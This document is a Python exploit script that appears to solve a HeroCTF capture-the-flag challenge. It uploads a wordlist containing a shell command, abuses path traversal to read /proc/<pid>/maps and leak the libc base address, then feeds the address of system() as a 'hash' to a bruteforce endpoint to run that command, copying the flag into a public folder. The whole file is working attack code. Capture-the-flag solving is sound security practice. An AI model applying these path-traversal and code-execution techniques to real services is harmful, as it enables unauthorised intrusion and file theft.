#!/usr/bin/env python3
import requests
from pwn import ELF, context, p64

context.arch = "amd64"

BASE_URL = "http://dyn01.heroctf.fr:11923"
API_URL = f"{BASE_URL}/api"
WORDLIST = "shell.txt"
COMMAND = "cp /app/flag_*.txt /app/api/assets/flag.txt"

def upload_wordlist():
    requests.post(f"{API_URL}/wordlist", json={"filename": WORDLIST, "content": COMMAND + "\n"})

def get_libc_base_address(pid: int):
    resp = requests.post(f"{API_URL}/wordlist/download", json={"filename": f"../../../../../proc/{pid}/maps"})
    lines = resp.json()["content"].splitlines()
    for line in lines:
        if "libc.so.6" in line and "r--p" in line:
            addr_range = line.split()[0]
            base_addr_str = addr_range.split("-")[0]
            return int(base_addr_str, 16)
    raise RuntimeError("Could not find libc base address in maps")

def start_bruteforce(algo: int, hash: str, wordlist: str):
    requests.post(f"{API_URL}/bruteforce", json={"algorithm": algo, "hash": hash, "wordlist": wordlist}, timeout=1)

def get_flag():
    resp = requests.get(f"{BASE_URL}/assets/flag.txt")
    print("Flag content:", resp.text)

if __name__ == "__main__":
    upload_wordlist()

    libc_elf = ELF("libc.so.6")
    libc_addr = get_libc_base_address(9)
    print("Libc: 0x{:x}".format(libc_addr))
    libc_elf.address = libc_addr

    system_addr = p64(libc_elf.symbols["system"]).hex().ljust(32, "0")
    print("Hash:", system_addr)

    for i in range(4, 32):
        try:
            start_bruteforce(i, system_addr, WORDLIST)
        except requests.exceptions.Timeout:
            print(f"Attempt with word length {i} timed out, trying next length...")

    get_flag()